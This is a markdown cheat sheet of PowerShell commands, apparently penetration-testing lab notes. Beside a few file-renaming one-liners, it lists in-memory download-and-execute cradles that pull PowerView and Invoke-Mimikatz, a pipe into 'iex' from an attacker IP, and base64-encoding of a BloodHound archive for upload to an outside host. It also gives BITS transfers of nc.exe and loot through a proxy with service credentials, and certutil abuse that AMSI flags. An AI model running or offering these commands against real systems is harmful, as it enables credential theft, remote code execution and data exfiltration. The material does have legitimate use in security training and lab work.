# powershell_cmds

## Change all file names to lower case in the current directory

```Powershell
Get-ChildItem | Rename-Item -NewName {$_.Name -replace $_.Name, $_.Name.ToLower()}
```

## Downloading file from raw github content via System.Net.WebClient
```Powershell
(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
```

## Downloading file from raw github content via Invoke-WebRequest (slower for downloading files)

```Powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
## Invoking payload in memory

```Powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

## If IE configuration hasn't been finished, use the -UseBasicParsing option

```Powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | iex
```

## Disable IE First Run Customization

```Powershell
reg add "HKLM\SOFTWARE\Microsoft\Internet Explorer\Main" /f /v DisableFirstRunCustomize /t REG_DWORD /d 2
```

## Other Powershell Download Cradles

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

## Uploading Files using Invoke-WebRequest

```Powershell
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```

## Background Intelligent Transfer Service (BITS) for HTTP sites and SMB shares

```Powershell
PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```

## BITS can utilize service credentials and proxy servers

### Download

```Powershell
PS C:\htb> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
```

### Upload

```Powershell
PS C:\htb> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
```

## Certutil (recognized by AMSI - Antimalware Scan Interface - as abusing)

```Powershell
certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
```

## Get User Agents for Powershell

```Powershell
PS C:\htb> [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | Format-List
```

## Bulk change extension for files in the current directory

```Powershell
ls | Rename-Item -NewName { [io.path]::ChangeExtension($_.name, "json") }
```
